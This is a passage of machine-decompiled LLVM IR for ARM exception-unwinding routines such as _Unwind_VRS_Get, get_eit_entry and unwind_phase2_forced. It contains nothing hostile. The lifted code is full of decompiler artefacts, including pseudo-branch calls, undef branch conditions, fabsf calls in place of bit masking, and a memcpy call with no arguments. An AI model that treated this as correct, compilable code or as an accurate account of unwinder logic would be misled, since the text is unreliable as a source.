  uselistorder i32 ()* @__aeabi_read_tp, { 65, 71, 70, 64, 63, 80, 79, 68, 69, 67, 66, 78, 77, 76, 75, 74, 73, 72, 18, 26, 28, 34, 62, 43, 42, 12, 6, 5, 11, 25, 24, 10, 3, 2, 13, 9, 8, 7, 48, 15, 23, 47, 46, 27, 20, 22, 21, 59, 58, 31, 30, 29, 32, 33, 57, 45, 56, 55, 17, 16, 54, 19, 61, 60, 41, 38, 37, 36, 44, 4, 53, 52, 35, 51, 14, 50, 49, 0, 1, 40, 39 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38, 39 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_17d0c, { 1, 0 }
}

define i32 @_Unwind_VRS_Get(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_17d1c = icmp eq i32 %regclass, 0
  br i1 %v2_17d1c, label %dec_label_pc_17d24, label %dec_label_pc_17d54

dec_label_pc_17d24:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17d24
  %v6_17d28 = icmp eq i32 %representation, 0
  br i1 %v6_17d28, label %dec_label_pc_17d38, label %bb8

.thread3:                                         ; preds = %dec_label_pc_17d24
  br label %dec_label_pc_17d60

bb8:                                              ; preds = %bb
  br label %dec_label_pc_17d60

dec_label_pc_17d38:                               ; preds = %bb
  %v3_17d38 = mul i32 %regno, 4
  %v2_17d3c = add i32 %v3_17d38, %context
  %v1_17d40 = add i32 %v2_17d3c, 4
  %v2_17d40 = inttoptr i32 %v1_17d40 to i32*
  %v3_17d40 = load i32, i32* %v2_17d40, align 4
  %v2_17d4c = bitcast i8* %valuep to i32*
  store i32 %v3_17d40, i32* %v2_17d4c, align 4
  ret i32 0

dec_label_pc_17d54:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_17d54
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_17d54, %bb9
  %v0_17d5c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_17d5c)
  br label %dec_label_pc_17d60

dec_label_pc_17d60:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_17d60, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_17d68 = icmp eq i32 %regclass, 0
  br i1 %v2_17d68, label %dec_label_pc_17d70, label %dec_label_pc_17da0

dec_label_pc_17d70:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17d70
  %v6_17d74 = icmp eq i32 %representation, 0
  br i1 %v6_17d74, label %dec_label_pc_17d84, label %bb8

.thread3:                                         ; preds = %dec_label_pc_17d70
  br label %dec_label_pc_17dac

bb8:                                              ; preds = %bb
  br label %dec_label_pc_17dac

dec_label_pc_17d84:                               ; preds = %bb
  %v3_17d88 = mul i32 %regno, 4
  %v1_17d8c = bitcast i8* %valuep to i32*
  %v2_17d8c = load i32, i32* %v1_17d8c, align 4
  %v2_17d90 = add i32 %v3_17d88, %context
  %v2_17d98 = add i32 %v2_17d90, 4
  %v3_17d98 = inttoptr i32 %v2_17d98 to i32*
  store i32 %v2_17d8c, i32* %v3_17d98, align 4
  ret i32 0

dec_label_pc_17da0:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_17da0
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_17da0, %bb9
  %v0_17da8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_17da8)
  br label %dec_label_pc_17dac

dec_label_pc_17dac:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_17dac, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
  %v1_17db4 = add i32 %context, 68
  %v2_17db4 = inttoptr i32 %v1_17db4 to i32*
  %v3_17db4 = load i32, i32* %v2_17db4, align 4
  ret i32 %v3_17db4

; uselistorder directives
  uselistorder i32 68, { 10, 8, 0, 9, 1, 3, 4, 5, 6, 2, 7 }
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_17dc4 = add i32 %exc, 8
  %v2_17dc4 = inttoptr i32 %v1_17dc4 to i32*
  %v3_17dc4 = load i32, i32* %v2_17dc4, align 4
  %v2_17dc8 = icmp eq i32 %v3_17dc4, 0
  br i1 %v2_17dc8, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_17ddc = xor i1 %v2_17dc8, true
  call void @__pseudo_cond_branch(i1 %v2_17ddc, i32 %v3_17dc4)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_17df4 = call i32 @abort()
  ret i32 %v0_17df4
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_17e00 = call i32 @abort()
  ret i32 %v0_17e00
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_17e04 = load i32, i32* @r4, align 4
  store i32 %v3_17e04, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r5.global-to-local, align 4
  %v4_17e14 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 132) to i32*), align 4
  %v2_17e18 = icmp eq i32 %v4_17e14, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_17e24 = add i32 %return_address, -2
  store i32 %v1_17e24, i32* %r4.global-to-local, align 4
  br i1 %v2_17e18, label %dec_label_pc_17e5c, label %dec_label_pc_17e2c

dec_label_pc_17e2c:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_17e14)
  %v2_17e3c = icmp eq i32 %v1_17e24, 0
  br i1 %v2_17e3c, label %.thread, label %dec_label_pc_17e7cthread-pre-split

.thread:                                          ; preds = %dec_label_pc_17e2c
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_17e44 = load i32, i32* %r6.global-to-local, align 4
  %v3_17e44 = add i32 %v2_17e44, 16
  %v4_17e44 = inttoptr i32 %v3_17e44 to i32*
  store i32 0, i32* %v4_17e44, align 4
  br label %dec_label_pc_17e4c

dec_label_pc_17e4c:                               ; preds = %.thread, %.thread10, %dec_label_pc_17ff4, %dec_label_pc_17fe0, %dec_label_pc_17fbc, %dec_label_pc_17f94, %dec_label_pc_17e94
  %v0_17e4c = load i32, i32* %r2.global-to-local, align 4
  %v2_17e54 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_17e54, i32* @r4, align 4
  ret i32 %v0_17e4c

dec_label_pc_17e5c:                               ; preds = %entry
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_17e64 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 20) to i32*), align 4
  %v4_17e68 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 48) to i32*), align 4
  store i32 %v4_17e68, i32* %r2.global-to-local, align 4
  %v2_17e6c = sub i32 %v4_17e64, %v4_17e68
  %v3_17e70 = sdiv i32 %v2_17e6c, 8
  store i32 %v3_17e70, i32* %stack_var_-36, align 4
  br label %dec_label_pc_17e7c

dec_label_pc_17e7cthread-pre-split:               ; preds = %dec_label_pc_17e2c
  %v3_17e7c.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_17e7c

dec_label_pc_17e7c:                               ; preds = %dec_label_pc_17e7cthread-pre-split, %dec_label_pc_17e5c
  %v0_17ec0.pre = phi i32 [ %v1_17e24, %dec_label_pc_17e7cthread-pre-split ], [ %v4_17e68, %dec_label_pc_17e5c ]
  %v1_17e84 = phi i32 [ %v3_17e7c.pr, %dec_label_pc_17e7cthread-pre-split ], [ %v3_17e70, %dec_label_pc_17e5c ]
  %v2_17e80 = icmp eq i32 %v1_17e84, 0
  br i1 %v2_17e80, label %dec_label_pc_17e94, label %dec_label_pc_17eb0.preheader

dec_label_pc_17eb0.preheader:                     ; preds = %dec_label_pc_17e7c
  %v2_17e84 = add i32 %v1_17e84, -1
  %v1_17ee0 = add i32 %v0_17ec0.pre, 8
  br label %dec_label_pc_17eb0.outer

dec_label_pc_17e94.loopexit:                      ; preds = %dec_label_pc_17f0c
  br label %dec_label_pc_17e94

dec_label_pc_17e94:                               ; preds = %dec_label_pc_17e94.loopexit, %dec_label_pc_17e7c, %dec_label_pc_17fd8
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_17e9c = load i32, i32* %r6.global-to-local, align 4
  %v2_17e9c = add i32 %v1_17e9c, 16
  %v3_17e9c = inttoptr i32 %v2_17e9c to i32*
  store i32 0, i32* %v3_17e9c, align 4
  br label %dec_label_pc_17e4c

dec_label_pc_17ea4:                               ; preds = %dec_label_pc_17f00
  %v3_17ea4 = icmp ult i32 %storemerge40, %v0_17f04
  br i1 %v3_17ea4, label %dec_label_pc_17eac, label %dec_label_pc_17f1c

dec_label_pc_17eac:                               ; preds = %dec_label_pc_17ea4
  %v1_17eac = add nsw i32 %v3_17eb8, 1
  br label %dec_label_pc_17eb0.outer

dec_label_pc_17eb0.outer:                         ; preds = %dec_label_pc_17eac, %dec_label_pc_17eb0.preheader
  %v1_17f0c.ph = phi i32 [ %v1_17eac, %dec_label_pc_17eac ], [ 0, %dec_label_pc_17eb0.preheader ]
  %v0_17eb0.ph = phi i32 [ %v0_17eb0, %dec_label_pc_17eac ], [ %v2_17e84, %dec_label_pc_17eb0.preheader ]
  br label %dec_label_pc_17eb0

dec_label_pc_17eb0:                               ; preds = %dec_label_pc_17eb0.outer, %dec_label_pc_17f14
  %v0_17eb0 = phi i32 [ %v1_17f14, %dec_label_pc_17f14 ], [ %v0_17eb0.ph, %dec_label_pc_17eb0.outer ]
  %v2_17eb0 = add i32 %v0_17eb0, %v1_17f0c.ph
  %tmp = icmp slt i32 %v2_17eb0, 0
  %v4_17eb4 = zext i1 %tmp to i32
  %v5_17eb4 = add i32 %v4_17eb4, %v2_17eb0
  %v3_17eb8 = sdiv i32 %v5_17eb4, 2
  %v3_17ebc = mul i32 %v3_17eb8, 8
  store i32 %v3_17ebc, i32* @ip, align 4
  %v2_17ec0 = add i32 %v3_17ebc, %v0_17ec0.pre
  %v3_17ec0 = inttoptr i32 %v2_17ec0 to i32*
  %v4_17ec0 = load i32, i32* %v3_17ec0, align 4
  %v1_17ec4 = and i32 %v4_17ec0, 1073741824
  %v2_17ec4 = icmp eq i32 %v1_17ec4, 0
  %v2_17ec8 = or i32 %v4_17ec0, -2147483648
  %tmp79 = bitcast i32 %v4_17ec0 to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_17ecc = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_17ec4, i32 %v2_17ecc, i32 %v2_17ec8
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_17ed0 = icmp eq i32 %v2_17e84, %v3_17eb8
  store i32 %v2_17ec0, i32* %r7.global-to-local, align 4
  br i1 %v9_17ed0, label %dec_label_pc_17f00, label %dec_label_pc_17ee0

dec_label_pc_17ee0:                               ; preds = %dec_label_pc_17eb0
  %v2_17ee4 = add i32 %v3_17ebc, %v1_17ee0
  %v3_17ee4 = inttoptr i32 %v2_17ee4 to i32*
  %v4_17ee4 = load i32, i32* %v3_17ee4, align 4
  %v1_17eec = and i32 %v4_17ee4, 1073741824
  %v2_17eec = icmp eq i32 %v1_17eec, 0
  %v2_17ef0 = or i32 %v4_17ee4, -2147483648
  %tmp81 = bitcast i32 %v4_17ee4 to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_17ef4 = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_17eec, i32 %v2_17ef4, i32 %v2_17ef0
  %v1_17ef8 = add i32 %v2_17ee4, -1
  %v2_17efc = add i32 %storemerge39, %v1_17ef8
  br label %dec_label_pc_17f00

dec_label_pc_17f00:                               ; preds = %dec_label_pc_17eb0, %dec_label_pc_17ee0
  %storemerge40 = phi i32 [ %v2_17efc, %dec_label_pc_17ee0 ], [ -1, %dec_label_pc_17eb0 ]
  %v2_17f00 = add i32 %storemerge, %v2_17ec0
  %v0_17f04 = load i32, i32* %r4.global-to-local, align 4
  %v3_17f04 = icmp ult i32 %v0_17f04, %v2_17f00
  br i1 %v3_17f04, label %dec_label_pc_17f0c, label %dec_label_pc_17ea4

dec_label_pc_17f0c:                               ; preds = %dec_label_pc_17f00
  %v9_17f0c = icmp eq i32 %v3_17eb8, %v1_17f0c.ph
  br i1 %v9_17f0c, label %dec_label_pc_17e94.loopexit, label %dec_label_pc_17f14

dec_label_pc_17f14:                               ; preds = %dec_label_pc_17f0c
  %v1_17f14 = add nsw i32 %v3_17eb8, -1
  br label %dec_label_pc_17eb0

dec_label_pc_17f1c:                               ; preds = %dec_label_pc_17ea4
  %v2_17f1c = load i32, i32* %v3_17ec0, align 4
  %v1_17f20 = and i32 %v2_17f1c, 1073741824
  %v2_17f20 = icmp eq i32 %v1_17f20, 0
  %v2_17f24 = or i32 %v2_17f1c, -2147483648
  %tmp83 = bitcast i32 %v2_17f1c to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_17f28 = bitcast float %tmp84 to i32
  %v0_17f2c = select i1 %v2_17f20, i32 %v2_17f28, i32 %v2_17f24
  %v2_17f2c = add i32 %v0_17f2c, %v2_17ec0
  %v1_17f30 = load i32, i32* %r6.global-to-local, align 4
  %v2_17f30 = add i32 %v1_17f30, 72
  %v3_17f30 = inttoptr i32 %v2_17f30 to i32*
  store i32 %v2_17f2c, i32* %v3_17f30, align 4
  %v0_17f34 = load i32, i32* %r7.global-to-local, align 4
  %v1_17f34 = add i32 %v0_17f34, 4
  %v2_17f34 = inttoptr i32 %v1_17f34 to i32*
  %v3_17f34 = load i32, i32* %v2_17f34, align 4
  %v7_17f38 = icmp eq i32 %v3_17f34, 1
  br i1 %v7_17f38, label %.thread10, label %dec_label_pc_17f4c

.thread10:                                        ; preds = %dec_label_pc_17f1c
  %v1_17f38 = add i32 %v3_17f34, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_17f44 = load i32, i32* %r6.global-to-local, align 4
  %v3_17f44 = add i32 %v2_17f44, 16
  %v4_17f44 = inttoptr i32 %v3_17f44 to i32*
  store i32 %v1_17f38, i32* %v4_17f44, align 4
  br label %dec_label_pc_17e4c

dec_label_pc_17f4c:                               ; preds = %dec_label_pc_17f1c
  %v1_17f4c = icmp slt i32 %v3_17f34, 0
  br i1 %v1_17f4c, label %.thread38, label %dec_label_pc_17f64

.thread38:                                        ; preds = %dec_label_pc_17f4c
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_17f58 = load i32, i32* %r6.global-to-local, align 4
  %v5_17f58 = add i32 %v4_17f58, 76
  %v6_17f58 = inttoptr i32 %v5_17f58 to i32*
  store i32 %v1_17f34, i32* %v6_17f58, align 4
  %v3_17f5c = load i32, i32* %r2.global-to-local, align 4
  %v4_17f5c = load i32, i32* %r6.global-to-local, align 4
  %v5_17f5c = add i32 %v4_17f5c, 80
  %v6_17f5c = inttoptr i32 %v5_17f5c to i32*
  store i32 %v3_17f5c, i32* %v6_17f5c, align 4
  br label %dec_label_pc_17f84

dec_label_pc_17f64:                               ; preds = %dec_label_pc_17f4c
  %v1_17f64 = and i32 %v3_17f34, 1073741824
  %v2_17f64 = icmp eq i32 %v1_17f64, 0
  %v2_17f68 = or i32 %v3_17f34, -2147483648
  %tmp85 = bitcast i32 %v3_17f34 to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_17f6c = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_17f64, i32 %v2_17f6c, i32 %v2_17f68
  %v1_17f70 = add i32 %storemerge42, 4
  %v2_17f74 = add i32 %v1_17f70, %v0_17f34
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_17f7c = load i32, i32* %r6.global-to-local, align 4
  %v2_17f7c = add i32 %v1_17f7c, 76
  %v3_17f7c = inttoptr i32 %v2_17f7c to i32*
  store i32 %v2_17f74, i32* %v3_17f7c, align 4
  %v0_17f80 = load i32, i32* %r2.global-to-local, align 4
  %v1_17f80 = load i32, i32* %r6.global-to-local, align 4
  %v2_17f80 = add i32 %v1_17f80, 80
  %v3_17f80 = inttoptr i32 %v2_17f80 to i32*
  store i32 %v0_17f80, i32* %v3_17f80, align 4
  br label %dec_label_pc_17f84

dec_label_pc_17f84:                               ; preds = %.thread38, %dec_label_pc_17f64
  %v0_17f84 = load i32, i32* %r6.global-to-local, align 4
  %v1_17f84 = add i32 %v0_17f84, 76
  %v2_17f84 = inttoptr i32 %v1_17f84 to i32*
  %v3_17f84 = load i32, i32* %v2_17f84, align 4
  store i32 %v3_17f84, i32* %r2.global-to-local, align 4
  %v1_17f88 = inttoptr i32 %v3_17f84 to i32*
  %v2_17f88 = load i32, i32* %v1_17f88, align 4
  %v1_17f8c = icmp slt i32 %v2_17f88, 0
  br i1 %v1_17f8c, label %dec_label_pc_17fb0, label %dec_label_pc_17f94

dec_label_pc_17f94:                               ; preds = %dec_label_pc_17f84
  %v1_17f94 = and i32 %v2_17f88, 1073741824
  %v2_17f94 = icmp eq i32 %v1_17f94, 0
  %v2_17f98 = or i32 %v2_17f88, -2147483648
  %tmp87 = bitcast i32 %v2_17f88 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_17f9c = bitcast float %tmp88 to i32
  %v0_17fa0 = select i1 %v2_17f94, i32 %v2_17f9c, i32 %v2_17f98
  %v2_17fa0 = add i32 %v0_17fa0, %v3_17f84
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_17fa8 = add i32 %v0_17f84, 16
  %v3_17fa8 = inttoptr i32 %v2_17fa8 to i32*
  store i32 %v2_17fa0, i32* %v3_17fa8, align 4
  br label %dec_label_pc_17e4c

dec_label_pc_17fb0:                               ; preds = %dec_label_pc_17f84
  %v3_17fb0 = udiv i32 %v2_17f88, 16777216
  %v1_17fb4 = urem i32 %v3_17fb0, 16
  %v2_17fb4 = icmp eq i32 %v1_17fb4, 0
  br i1 %v2_17fb4, label %dec_label_pc_17fbc, label %dec_label_pc_17fd0

dec_label_pc_17fbc:                               ; preds = %dec_label_pc_17fb0
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_17fc4 = load i32, i32* %r5.global-to-local, align 4
  %v2_17fc4 = add i32 %v0_17fc4, -36896
  %v2_17fc8 = add i32 %v0_17f84, 16
  %v3_17fc8 = inttoptr i32 %v2_17fc8 to i32*
  store i32 %v2_17fc4, i32* %v3_17fc8, align 4
  br label %dec_label_pc_17e4c

dec_label_pc_17fd0:                               ; preds = %dec_label_pc_17fb0
  %v7_17fd0 = icmp eq i32 %v1_17fb4, 1
  br i1 %v7_17fd0, label %dec_label_pc_17ff4, label %dec_label_pc_17fd8

dec_label_pc_17fd8:                               ; preds = %dec_label_pc_17fd0
  %v7_17fd8 = icmp eq i32 %v1_17fb4, 2
  br i1 %v7_17fd8, label %dec_label_pc_17fe0, label %dec_label_pc_17e94

dec_label_pc_17fe0:                               ; preds = %dec_label_pc_17fd8
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_17fe8 = load i32, i32* %r5.global-to-local, align 4
  %v2_17fe8 = add i32 %v0_17fe8, -36912
  %v2_17fec = add i32 %v0_17f84, 16
  %v3_17fec = inttoptr i32 %v2_17fec to i32*
  store i32 %v2_17fe8, i32* %v3_17fec, align 4
  br label %dec_label_pc_17e4c

dec_label_pc_17ff4:                               ; preds = %dec_label_pc_17fd0
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_17ffc = load i32, i32* %r5.global-to-local, align 4
  %v2_17ffc = add i32 %v0_17ffc, -36904
  %v2_18000 = add i32 %v0_17f84, 16
  %v3_18000 = inttoptr i32 %v2_18000 to i32*
  store i32 %v2_17ffc, i32* %v3_18000, align 4
  br label %dec_label_pc_17e4c

; uselistorder directives
  uselistorder i32 %v1_17fb4, { 2, 1, 0 }
  uselistorder i32 %v0_17f84, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_17f34, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_17f04, { 1, 0 }
  uselistorder i32 %v3_17ebc, { 2, 1, 0 }
  uselistorder i32 %v3_17eb8, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_17eb0, { 1, 0 }
  uselistorder i32 %v0_17eb0, { 1, 0 }
  uselistorder i32 %v2_17e84, { 1, 0 }
  uselistorder i32 %v0_17ec0.pre, { 1, 0 }
  uselistorder i32 %v3_17e70, { 1, 0 }
  uselistorder i32 %v1_17e24, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 14, 13 }
  uselistorder i32 132, { 0, 3, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_17f84, { 1, 0 }
  uselistorder label %dec_label_pc_17f00, { 1, 0 }
  uselistorder label %dec_label_pc_17eb0, { 1, 0 }
  uselistorder label %dec_label_pc_17e94, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17e4c, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_1800c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1800c:
  %v0_1800c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1800c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1800c
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1800c, %bb
  %v10_18014 = phi i32 [ %arg1, %dec_label_pc_1800c ], [ 0, %bb ]
  ret i32 %v10_18014

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %v1_18028 = add i32 %entry_vrs, 4
  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v1_1803c = inttoptr i32 %v1_18028 to i32*
  %v2_1803c = load i32, i32* %v1_1803c, align 4
  store i32 %v2_1803c, i32* %r0.global-to-local, align 4
  %v12_1803c = add i32 %entry_vrs, 20
  %v1_18048 = inttoptr i32 %v12_1803c to i32*
  %v2_18048 = load i32, i32* %v1_18048, align 4
  store i32 %v2_18048, i32* %r0.global-to-local, align 4
  %v12_18048 = add i32 %entry_vrs, 36
  %v1_18050 = inttoptr i32 %v12_18048 to i32*
  %v2_18050 = load i32, i32* %v1_18050, align 4
  store i32 %v2_18050, i32* %r0.global-to-local, align 4
  %v12_18050 = add i32 %entry_vrs, 52
  store i32 %v12_18050, i32* @ip, align 4
  %v13_18054 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_18054, i32* @lr, align 4
  %v1_18058 = inttoptr i32 %v12_18050 to i32*
  %v2_18058 = load i32, i32* %v1_18058, align 4
  store i32 %v2_18058, i32* %r0.global-to-local, align 4
  %v9_18058 = add i32 %entry_vrs, 64
  %v10_18058 = inttoptr i32 %v9_18058 to i32*
  %v11_18058 = load i32, i32* %v10_18058, align 4
  store i32 0, i32* @r4, align 4
  %v1_18060 = add i32 %ucbp, 12
  %v2_18060 = inttoptr i32 %v1_18060 to i32*
  %v3_18060 = load i32, i32* %v2_18060, align 4
  store i32 %v2_18058, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_18078 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_18058)
  store i32 %v2_18078, i32* %r0.global-to-local, align 4
  %v0_1807c = load i32, i32* @r6, align 4
  %v1_1807c = load i32, i32* @r4, align 4
  %v9_1807c = icmp eq i32 %v0_1807c, %v1_1807c
  store i32 %v2_18078, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_1807c, label %dec_label_pc_18090, label %.thread

.thread:                                          ; preds = %entry
  br label %dec_label_pc_1809c

dec_label_pc_18090:                               ; preds = %entry
  store i32 %v0_1807c, i32* @r4, align 4
  br label %dec_label_pc_18098

dec_label_pc_18098:                               ; preds = %dec_label_pc_18160, %dec_label_pc_18090
  br label %dec_label_pc_1809c

dec_label_pc_1809c:                               ; preds = %.thread, %dec_label_pc_18098
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_18098 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_1809c = icmp eq i32 %v2_18078, 0
  br i1 %v2_1809c, label %dec_label_pc_18114, label %.thread2.dec_label_pc_180b0_crit_edge

.thread2.dec_label_pc_180b0_crit_edge:            ; preds = %dec_label_pc_1809c
  br label %dec_label_pc_180b0

dec_label_pc_180b0:                               ; preds = %.thread2.dec_label_pc_180b0_crit_edge, %dec_label_pc_18114
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_180c0 = load i32, i32* @r5, align 4
  store i32 %v0_180c0, i32* @r3, align 4
  store i32 98512, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_18060)
  br i1 false, label %dec_label_pc_180d8, label %dec_label_pc_18100

dec_label_pc_180d8:                               ; preds = %dec_label_pc_180b0
  br i1 undef, label %dec_label_pc_180e0, label %dec_label_pc_18104

dec_label_pc_180e0:                               ; preds = %dec_label_pc_180d8
  br i1 undef, label %dec_label_pc_18160, label %dec_label_pc_180f8

dec_label_pc_180f8:                               ; preds = %dec_label_pc_180e0
  br i1 undef, label %dec_label_pc_18158, label %dec_label_pc_18100

dec_label_pc_18100:                               ; preds = %dec_label_pc_180b0, %dec_label_pc_180f8
  br label %dec_label_pc_18104

dec_label_pc_18104:                               ; preds = %dec_label_pc_180d8, %dec_label_pc_18100
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

dec_label_pc_18114:                               ; preds = %dec_label_pc_1809c
  store i32 %v11_18058, i32* @r3, align 4
  %v2_18118 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_18118, i32* @r4, align 4
  %v1_1811c = load i32, i32* @r5, align 4
  %v2_1811c = add i32 %v1_1811c, 20
  %v3_1811c = inttoptr i32 %v2_1811c to i32*
  store i32 %v11_18058, i32* %v3_1811c, align 4
  store i32 %v2_18118, i32* @r0, align 4
  store i32 %.pre, i32* @r1, align 4
  store i32 304, i32* @r2, align 4
  %v0_1812c = call i32 @memcpy()
  %v0_18134 = load i32, i32* @r6, align 4
  store i32 %v0_18134, i32* %r0.global-to-local, align 4
  %v0_18138 = load i32, i32* @r5, align 4
  %v1_1813c = add i32 %v0_18138, 16
  %v2_1813c = inttoptr i32 %v1_1813c to i32*
  %v3_1813c = load i32, i32* %v2_1813c, align 4
  store i32 %v3_1813c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_1813c)
  %v0_1814c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1814c, i32* @r4, align 4
  br label %dec_label_pc_180b0

dec_label_pc_18158:                               ; preds = %dec_label_pc_180f8
  br label %dec_label_pc_18160

dec_label_pc_18160:                               ; preds = %dec_label_pc_180e0, %dec_label_pc_18158
  br label %dec_label_pc_18098

; uselistorder directives
  uselistorder i32 %v11_18058, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 ()* @memcpy, { 2, 6, 5, 1, 0, 4, 3, 8, 7 }
